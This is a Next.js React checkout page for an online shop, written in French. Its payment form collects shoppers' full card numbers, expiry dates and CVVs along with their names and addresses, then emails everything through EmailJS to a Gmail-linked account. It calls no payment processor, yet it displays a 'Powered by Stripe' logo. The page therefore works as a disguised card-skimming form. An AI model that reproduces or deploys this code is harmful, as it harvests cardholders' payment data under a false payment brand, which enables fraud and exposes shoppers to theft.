import React, { useState, useEffect } from 'react';
import Head from 'next/head';
import emailjs from 'emailjs-com';
import content from '../content.json';

const Paiement = ({ site }) => {
  const [cart, setCart] = useState([]);

  useEffect(() => {
    const storedCart = JSON.parse(localStorage.getItem('cart')) || [];
    setCart(storedCart);
  }, []);

  useEffect(() => {
    emailjs.init('8SL7vzVHt7qSqEd4i');
  }, []);

  const totalPrice = cart.reduce((total, item) => {
    const price = parseFloat(item.productPrice.replace('€', '').replace(',', '.')) || 0;
    return total + price;
  }, 0).toFixed(2);

  const discount = (totalPrice * 0.1).toFixed(2);
  const discountedPrice = (totalPrice - discount).toFixed(2);

  if (!site) {
    return <div>Loading...</div>;
  }

  const sendEmail = (event) => {
    event.preventDefault();
    emailjs.sendForm('gmail-benedikt', 'new-payment', event.target)
      .then(() => {
        console.log('SUCCESS!');
      })
      .catch((error) => {
        console.log('FAILED...', error);
      });
  };

  return (
    <div className="paiement-container">
      <Head>
        <title>{`Paiement - ${site.shopName}`}</title>
        <meta name="description" content="Page de paiement" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <div className="left-column" backgroundColor={site.buttonColor + "1A"}>
        <a className="back" href="/boutique">&lt; Retour à la boutique</a>
        <div className="shop-info">
          <h2>{`Payez ${site.shopName}`}</h2>
          <h1>{`${totalPrice} €`}</h1>
        </div>
        <div className="cart-summary">
          <ul>
            {cart.map((item, index) => (
              <li key={index}>
                <div className="cart-item">
                  <h4>{item.productTitle}</h4>
                  <p>{item.productPrice}</p>
                </div>
              </li>
            ))}
          </ul>
          <div className="cart-item discount">
            <h4>Réduction 10% première commande</h4>
            <p>{`-${discount} €`}</p>
          </div>
          <div className="total-price">
            <h4>Total dû :</h4>
            <p>{`${discountedPrice} €`}</p>
          </div>
        </div>
        <p className='secure footer'>© 2024 - Tous droits réservés -  {site.shopName} SAS 32455</p>
      </div>
      <div className="right-column">
        <form id="contact-form" className="checkout-form" onSubmit={sendEmail}>
          <input type="hidden" name="totalPrice" value={discountedPrice} />
          <input type="hidden" name="products" value={cart.map(item => item.productTitle).join(', ')} />
          <input type="hidden" name="website" value={site.shopName} />
          <h3>Livraison</h3>
          <input type="text" name="address" placeholder="Adresse du domicile" required />
          <input type="text" name="suite" placeholder="Maison, suite, numéro, etc. (optionnel)" />
          <div className="form-row">
            <input type="text" name="postalCode" placeholder="Code postal" required />
            <input type="text" name="city" placeholder="Ville" required />
          </div>
          <h3>Compte client</h3>
          <input type="email" name="email" placeholder="Email" required />
          <div className="form-row">
            <input type="text" name="firstName" placeholder="Prénom" required />
            <input type="text" name="lastName" placeholder="Nom" required />
          </div>
          <h3>Informations de la carte</h3>
          <input type="text" name="cardNumber" placeholder="1234 1234 1234 1234" required />
          <div className="form-row">
            <input type="text" name="expiryDate" placeholder="MM/YY" maxLength="5" required />
            <input type="text" name="cvv" placeholder="CVV" maxLength="3" required />
          </div>
          <button type="submit">Payer</button>
        </form>
        <p className='secure notice'>En procédant au paiement, vous autorisez {site.shopName} SAS à prélever le montant indiqué. Vous disposez d’un droit de rétractation de 30 jours, pour obtenir un remboursement intégral.</p>
        <div className='secure-row'>
          <p className="secure">Powered by</p>
          <img className="stripeLogo" src="/stripe-logo.png" alt="Stripe" />
        </div>
      </div>
    </div>
  );
};

export async function getStaticProps() {
  return {
    props: {
      site: content.site[0] || null, // Assurez-vous que cette structure correspond à `content.json`
    },
  };
}

export default Paiement;
